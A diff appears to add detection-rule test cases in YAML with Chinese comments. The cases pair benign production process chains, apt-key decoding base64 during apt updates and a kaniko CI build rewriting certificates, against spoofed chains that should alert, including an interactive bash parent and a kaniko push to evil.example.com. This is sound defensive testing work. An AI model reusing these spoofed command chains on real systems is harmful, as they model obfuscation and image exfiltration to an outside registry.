@@ -564,3 +564,131 @@ cases:
           path: /usr/bin/dpkg
         cmd_line: "/usr/bin/dpkg --status-fd 11 --configure --pending"
     expect: detected
+
+  # 生产实测形态（2026-11-20 k3s-master-3）：apt-key 与 apt.systemd.daily 以脚本自身路径出现
+  - name: 良性链：apt-key 以脚本自身路径出现（生产形态）调 base64 -d 放行
+    technique: T1027
+    source: prod apt-gpgv-docker-verify k3s-master-3 2026-11-20
+    class: 1007
+    os: linux
+    event:
+      activity_id: 1
+      process:
+        name: base64
+        file:
+          path: /usr/bin/base64
+        cmd_line: "base64 -d"
+        parent_process:
+          name: apt-key
+          file:
+            path: /usr/bin/apt-key
+          cmd_line: "/usr/bin/apt-key --quiet --readonly --keyring /etc/apt/keyrings/docker.asc verify --status-fd 3 /tmp/apt.sig.raLE75 /tmp/apt.data.bUvJhn"
+    ancestors:
+      - name: gpgv
+        file:
+          path: /usr/lib/apt/methods/gpgv
+        cmd_line: /usr/lib/apt/methods/gpgv
+      - name: apt-get
+        file:
+          path: /usr/bin/apt-get
+        cmd_line: "apt-get -qq -y update"
+      - name: apt.systemd.daily
+        file:
+          path: /usr/lib/apt/apt.systemd.daily
+        cmd_line: "/usr/lib/apt/apt.systemd.daily lock_is_held update"
+    expect: undetected
+
+  - name: 仿冒链：apt-key 生产形态但没有 apt-get update 祖先，base64 -d 照常告警
+    technique: T1027
+    source: counterfactual apt-gpgv-docker-verify
+    class: 1007
+    os: linux
+    event:
+      activity_id: 1
+      process:
+        name: base64
+        file:
+          path: /usr/bin/base64
+        cmd_line: "base64 -d"
+        parent_process:
+          name: apt-key
+          file:
+            path: /usr/bin/apt-key
+          cmd_line: "/usr/bin/apt-key --quiet --readonly --keyring /etc/apt/keyrings/docker.asc verify --status-fd 3 /tmp/x /tmp/y"
+    ancestors:
+      - name: bash
+        file:
+          path: /usr/bin/bash
+        cmd_line: "bash -i"
+    expect: detected
+
+  # GitLab CI kaniko 构建（生产实测 2026-11-20 k3s-ci-agent-1）
+  - name: 良性链：kaniko 构建公司镜像时 update-ca-certificates 改写证书目录放行
+    technique: T1222.002
+    source: prod gitlab-ci-kaniko-build k3s-ci-agent-1 2026-11-20
+    class: 1007
+    os: linux
+    event:
+      activity_id: 1
+      container:
+        uid: f85c4f712cf8
+        runtime: containerd
+      process:
+        name: chmod
+        file:
+          path: /usr/bin/chmod
+        cmd_line: "chmod 644 /etc/ssl/certs/ca-certificates.crt"
+        parent_process:
+          name: update-ca-certificates
+          file:
+            path: /usr/sbin/update-ca-certificates
+          cmd_line: "update-ca-certificates --hooksdir"
+    ancestors:
+      - name: ca-certificates.postinst
+        file:
+          path: /var/lib/dpkg/info/ca-certificates.postinst
+        cmd_line: "/var/lib/dpkg/info/ca-certificates.postinst configure"
+      - name: dpkg
+        file:
+          path: /usr/bin/dpkg
+        cmd_line: "/usr/bin/dpkg --status-fd 15 --configure --pending"
+      - name: apt-get
+        file:
+          path: /usr/bin/apt-get
+        cmd_line: "apt-get install -y --no-install-recommends gettext-base ca-certificates supervisor"
+      - name: sh
+        file:
+          path: /bin/sh
+        cmd_line: "/bin/sh -c apt-get install -y ca-certificates"
+      - name: executor
+        file:
+          path: /kaniko/executor
+        cmd_line: "/kaniko/executor --context /builds/root/DynamicDefend/. --dockerfile /builds/root/DynamicDefend/web/Dockerfile --destination registry.internal.yuzhian.com.cn/root/dynamicdefend/manage-nginx:37acad06"
+    expect: undetected
+
+  - name: 仿冒链：kaniko 推向外部仓库（非公司镜像仓库）时照常告警
+    technique: T1222.002
+    source: counterfactual gitlab-ci-kaniko-build
+    class: 1007
+    os: linux
+    event:
+      activity_id: 1
+      container:
+        uid: abcdef123456
+        runtime: containerd
+      process:
+        name: chmod
+        file:
+          path: /usr/bin/chmod
+        cmd_line: "chmod 644 /etc/ssl/certs/ca-certificates.crt"
+        parent_process:
+          name: sh
+          file:
+            path: /bin/sh
+          cmd_line: "/bin/sh -c chmod 644 /etc/ssl/certs/ca-certificates.crt"
+    ancestors:
+      - name: executor
+        file:
+          path: /kaniko/executor
+        cmd_line: "/kaniko/executor --context /builds/x/. --destination evil.example.com/x:latest"
+    expect: detected
